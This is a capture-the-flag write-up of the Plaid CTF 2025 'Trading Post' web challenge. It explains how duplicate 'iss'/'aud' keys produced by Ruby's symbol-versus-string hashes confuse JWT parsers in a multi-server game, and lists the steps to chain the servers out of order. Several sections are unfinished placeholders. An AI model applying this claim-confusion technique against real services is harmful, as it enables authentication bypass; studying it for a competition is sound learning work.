Last week, I participated in **Plaid CTF 2025** with a newly formed merger team, **[:]** (pronounced "slices"). I mainly focused on web challenges and had a great time collaborating with other talented web CTF players.

With the help of my teammates, I was fortunate enough to flag for one of the challenges: *Trading Post*. By the end of the competition, it had only 7 solves. The challenge had a complex but fascinating concept, requiring a deep understanding of JWT and **seven different programming languages**.

## The Website at a Glance

First, you land on a page with a checklist containing six items. At the beginning, you can only access the link associated with the first item.

Clicking on it takes you to a page where you can trade gold and items using a token.

You continue progressing through the checklist in order, buying and trading various items along the way.

After completing the checklist, you're taken to the *trailhead* page. On this page, you use the items you've acquired so far to simulate a journey. When you read the code, you'll soon realize that the final objective of the challenge is to complete the full journey without dying.

## What’s Going On Inside

When you look at the source code for this challenge, you'll be surprised to find that each link in the checklist is handled by a different server. In total, the challenge consists of nine servers — one for each checklist item plus one server for routing through the checklist and another for the trailhead page.

$$全体の図式化$$

How do they interact with each other? Each server is **stateless**, meaning it doesn't store any state on the server side using memory or a database. Instead, each server receives a JWT token from the previous one, modifies it (by adding, editing, or removing data according to the provided parameters), and then passes the newly created JWT to the next server.

### What's a JWT? And why is it secure (when used correctly)?

A JSON Web Token, or JWT for short, is an open standard (defined in RFC7519) that adds a digital signature to a JSON object to prevent tampering.

Each token looks like this:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJjaGFydGVyLWF1dGhvcml0eSIsImF1ZCI6InRva2VuLWV4Y2hhbmdlIiwiZHlzZW50ZXJ5Ijp0cnVlLCJwb3NzZXNzaW9ucyI6WyJnb2xkIHBvY2tldCB3YXRjaCIsInRpbnR5cGUgcGhvdG9ncmFwaHMiLCJkaWFyeSIsImpld2VscnkiXSwiZ29sZCI6NTAsIndhZ29uIjp7IndoZWVscyI6eyJmcm9udExlZnQiOjAuOCwiYmFja0xlZnQiOjAuNzUsImZyb250UmlnaHQiOjAuMiwiYmFja1JpZ2h0IjowLjE1fSwiYXhsZXMiOnsiZnJvbnQiOjAuNiwiYmFjayI6MC4zNX0sImNvdmVyIjowLjU1fSwiYW5pbWFscyI6W3sibmFtZSI6IkJlc3NpZSIsInR5cGUiOiJveCIsImNvbmRpdGlvbnMiOltdLCJoZWFsdGgiOjAuNzUsInNwZWVkIjo1LCJzdGFtaW5hIjo4fSx7Im5hbWUiOiJNb2xseSIsInR5cGUiOiJveCIsImNvbmRpdGlvbnMiOltdLCJoZWFsdGgiOjAuOSwic3BlZWQiOjQsInN0YW1pbmEiOjl9LHsibmFtZSI6IkRhaXN5IiwidHlwZSI6Im94IiwiY29uZGl0aW9ucyI6W10sImhlYWx0aCI6MC44LCJzcGVlZCI6Nywic3RhbWluYSI6Nn0seyJuYW1lIjoiSmVubnkiLCJ0eXBlIjoib3giLCJjb25kaXRpb25zIjpbXSwiaGVhbHRoIjowLjcsInNwZWVkIjozLCJzdGFtaW5hIjoxMH0seyJuYW1lIjoiQnVjayIsInR5cGUiOiJtdWxlIiwiY29uZGl0aW9ucyI6WyJzbmFrZWJpdGUiXSwiaGVhbHRoIjowLjE1LCJzcGVlZCI6Niwic3RhbWluYSI6N30seyJuYW1lIjoiSmFjayIsInR5cGUiOiJtdWxlIiwiY29uZGl0aW9ucyI6WyJkZWh5ZHJhdGlvbiJdLCJoZWFsdGgiOjAuOTUsInNwZWVkIjo1LCJzdGFtaW5hIjo4fV0sImlhdCI6MTc0NDI5MDA3NX0.jrH3xNl3B3SETbV6yyI5jURIFOdCSYCm1rnLCG751_g
```

A JWT consists of three parts, each separated by a dot (`.`). Each part is base64-encoded.

* The **first part** is the *header*, which includes metadata such as the algorithm used to sign the data.

* The **second part** is the *payload*, which contains the actual JSON data.

* The **third part** is the *signature*, which verifies that the data hasn’t been tampered with.

In this challenge, all servers share the same secret key and sign the tokens using the HS256 algorithm, which uses SHA256 hash as a signature. This means you cannot forge a valid JWT without knowing the key. Unless one of the services has a vulnerability that leaks this key, the only way to generate a valid JWT is by going through the provided servers.

### Issuer and Audience Claims
If all servers use the same key, does that mean any server can verify the data, regardless of which server created the JWT? Maybe we could go through the servers in an unintended order to trigger buggy behavior.
Unfortunately, the challenge prevents this using the **issuer** and **audience** claims (see [RFC 7519 Section 4.1](https://datatracker.ietf.org/doc/html/rfc7519#section-4.1)).

For example, the payload after the first checklist step looks like this:

```json
{
    "possessions": [],
    "gold": 0,
    "tokens": 500,
    "wagon": {
        "wheels": {
            "frontLeft": 0.8,
            "backLeft": 0.75,
            "frontRight": 0.2,
            "backRight": 0.15
        },
        "axles": {
            "front": 0.6,
            "back": 0.35
        },
        "cover": 0.55
    },
    "dysentery": true,
    "animals": [],
    "iss": "token-exchange",
    "aud": "charter-authority",
    "iat": 1744289571
}
```

This token tells us that:

* **The issuer** (i.e., the server that created the JWT) is `token-exchange`

* **The audience** (i.e., the server that should receive the JWT) is `charter-authority`

Each server checks whether the `iss` and `aud` claims are valid. This prevents us from skipping, repeating, or reordering the checklist steps.

We might still try to manipulate the `iss` or `aud` fields in some services. But before attempting that, let’s analyze how the JWT is supposed to be constructed in the final payload.

## Analyzing trailhead

(Huge thanks to Ani for going through the logic and analizing the winning condition in trailhead!)

After playing with the simulation for serveral times, we realized that no matter what, we will die from dysentery. The code that does this looks like this:

```python:trailhead/trailhead.py
		if payload["dysentery"]:
			dysentery_days += 1
			if random.random() < (dysentery_days * 0.01):
				journey_log.append(f"Day {day}: You finally succumbed to dysentery after traveling {int(distance)} miles")
				return render_template("dead.html", title="You died", log=journey_log)
			daily_events.append("You struggled with dysentery")
```

This means that when we have dysentery, we can only servive for **100 days** even if we are extremely lucky. We need to travel **2400 miles** to win, which means we need to travel at least **24 miles** per day.

How fast can we go? In conclusion, the travel distance per day look like this:

$$suushiki$$

Since most of the values are capped using `min` function or hard-coded to have the maximum value, the only value that affect the speed and can be manipulated using JWT is the `wagon_health`.

To summarize, the winning condition is either of the two:

* Setting `dysentery` to falsy value (i.e. `false`, empty string, empty object or undefined).
* Setting `wagon.wheels.frontLeft`, `wagon.wheels.frontRight`, `wagon.wheels.backRight`, `wagon.wheels.backleft`, `wagon.axels.back`, `wagon.axels.front`, `wagon.cover` to a large number.

## Analyzing the preperations

Let's see what other servers are doing to see if either of the two winning condition is possible.

**Charter authority** server connects 2 servers using `GET /callback` endpoint. When it does this, it mutates and checks types of some fields using `zod` library. For example, the code that connects from the first checklist item from the second look like this.

```typescript:charter-authority/src/index.ts
app.get("/callback", async (req, res) => {
	const query = z.object({ service: z.string(), token: z.string() }).parse(req.query);

	switch (query.service) {
		case "token-exchange": {
			const token = verify(query.token, tokenExchangeResponseSchema);
			const jwt = sign<LiveryRequest>({
				iss: "charter-authority",
				aud: "livery",
				possessions: token.possessions,
				dysentery: true,
				tokens: token.tokens,
				gold: token.gold,
				wagon: token.wagon,
				animals: token.animals,
			});
			return res.view("progress", { progress: 1, jwt, domain });
		}
    /* ... */
  }
})
```

```typescript:charter-authority/src/jwt.ts
export function verify<T>(token: string, schema: ZodSchema<T>): T {
	try {
		const payload = jwt.verify(token, JwtSecret, { algorithms: ["HS256"] });
		return schema.parse(payload);
	} catch (error) {
		console.error(error);
		throw new SafeError(400, "Invalid JWT");
	}
}
```

```typescript:charter-authority/src/schema.ts
export const tokenExchangeResponseSchema = z.object({
	iss: z.literal("token-exchange", { message: "Invalid issuer" }),
	aud: audClaim("charter-authority"),
	dysentery: z.literal(true),
	possessions: z.array(z.string()),
	tokens: z.number(),
	gold: z.number().optional(),
	wagon: wagonSchema.optional(),
	animals: z.array(animalSchema),
});
```

Important thing to note here is that **everytime the data go through `GET /callback` endpoint, dysentery field will be set to `true`**. This makes it really hard to go to trailhead without dysentery.

The other servers does the following:

* 


The following image shows how the JWT payload changes through the process.

$$画像$$

It looks like the only server that changes wagon field is **wagon repair** server. Let's see what it does to wheels.


```ruby:wagon-repair/main.rb
if params[:wheels]
  params[:wheels].each do |wheel, action|
    next if action.empty?
    current_value = payload["wagon"]["wheels"][wheel].to_f

    if action == "repair"
      total_cost += REPAIR_PRICES["wheels"].to_f
      payload["wagon"]["wheels"][wheel] = current_value + ((1 - current_value) / 2)
    elsif action == "replace"
      total_cost += NEW_PRICES["wheels"].to_f
      payload["wagon"]["wheels"][wheel] = 1.0
    end
  end
end
```

The initial value of `payload["wagon"]["wheels"][wheels]` is 0.15~0.8. Unfortunately, this shows that the maximum value the `wagon.wheels.frontLeft` can get is `1.0`, by replacing them. 

We concluded that it is impossible to go through the journey with normal gameplay. After all, this is a CTF challenge and there must be some kind of exploit somewhere.

## Analyzing wagon repair

navy356 found out an interesting feature in wagon repair server.

```ruby:wagon-repair/main.rb
if params[:spares]
  params[:spares].each do |item_type, count|
    price = NEW_PRICES[item_type].to_f
    total_cost += count.to_f * price
    payload[item_type] = count
  end
end
```

This enables us to set any field to a specified string. For example, 

$$コード$$

We cannot set `wagon` object here. When we try to set an object to a field, following error will be raised.

On the other hand, we can set `dysentery` field to an empty string, which is the falsy value that we wanted. 

Of cause, even if we can set `dysentery` value here, it will be overriden in charter authority server. Can we override `iss` and `aud` field to go to trialhead right after this server?

The following code overrides `iss` and `aud` field after we set the value, so this looks impossible.

```ruby:wagon-repair/main.rb
payload[:iss] = "wagon-repair"
payload[:aud] = "charter-authority"
new_jwt = JWT.encode(payload, $jwt_secret, "HS256")
```

If you use tools like [jwt.io](https://jwt.io/) or [PyJWT](https://pyjwt.readthedocs.io/en/stable/), you might think that it is indeed overwritten.

However, it turns out that this is not true! In ruby, `payload["iss"]` and `payload[:iss]` is different things. 

```ruby
payload = {}
payload["iss"] = "something"
payload[:iss] = "other"

puts payload["iss"] # something
puts payload[:iss] # other
puts payload["iss"] == payload[:iss] # false
```

The former uses string and the latter is symbol. Hence, it does not overwrite, but instead the values co-exist in the `payload` object.

What happens if this was turned into JWT using `JWT.encode`? It turns out, both field will be output!

```ruby
require 'json'

payload = {}
payload["iss"] = "something"
payload[:iss] = "other"

# Internally, JWT.encode uses JSON.generate
puts JSON.generate(payload) 
# {"iss":"something","iss":"other"}
```

If you decode the JWT output by wagon repair without decoding JSON in PyJWT, you'll see that this is true:

What happens when a library tries to decode JSON with duplicate field like this? Actually, there is no definitive standard on this, so some library may prefer the former and others prefer the latter. The tools like jwt.io and PyJWT prefers the latter, so it was hidden in the previous example.

Let's see if the other servers uses the first `iss` and `aud` or the second. It turns out, only general store server prefers the first. Let's see what we can do here.

## Analyzing general store

General store server also had interesting feature, found by Clovis Mint. 

...

In conclusion, we can set any value as long as it satisfies either of the conditions:
* Field that doesn't already exist in the payload.
* `exp`, `iat`, `nbf`, `aud` or `iss` field.

Wait... we can set `iss` and `aud` field? That means we can go whereever we want!

By following steps, we go to trailhead with dysentery set to empty string.

1. Proceed to wagon repair server normally.
2. In wagon repair server, set `dysentery` to empty string, `iss` to `charter-authority` and `aud` to `general-store`.
3. Go to general store server, instead of charter authority server.
4. In general store server, set `iss` to `charter-authority` and `aud` to `trailhead`.

Here is the code that does this:

$$コード$$

However, trailhead server raises an following error.

$$エラー文$$

It turns out that the payload was missing `supplies` field that should look like this:

$$payload$$

We cannot add this payload in wagon repair server because the value is an object. Nor can the general store server because you cannot set numbers to the field.

The only way to set this value is by going to charter authority server with `iss` set to `general-store` and `aud` set to `charter-authority`. 

$$コード$$

If we do this after we set `dysentery` to empty string then it will be overwritten to `true`. Hence, we have to go here *before* `dysentery` to empty string. How can we do this?


## Are `iss` and `aud` checks perfect?

Until now, we assumed that `iss` and `aud` checks are done correctly in every server. However, this wasn't actually true. In fact, one of the checks are intentionally left out.

$$コード$$

This doesn't mean other checks are done correctly, right? After some experiment, we found out that *`iss` and `aud` checks in wagon repair server isn't working at all*.

Let's see how it was implemented.

This means that we can go back to wagon repair server after `supplies` field was set.

## Putting all together

Now we are ready to craft the payload!

1. Proceed to general store and then charter authority server nomally
2. Go *back* to wagin repair because `iss` and `aud` check isn't working.
3. In wagon repair server, set `dysentery` to empty string, `iss` to `charter-authority` and `aud` to `general-store`.
4. Go to general store server, instead of charter authority server.
5. In general store server, set `iss` to `charter-authority` and `aud` to `trailhead`.
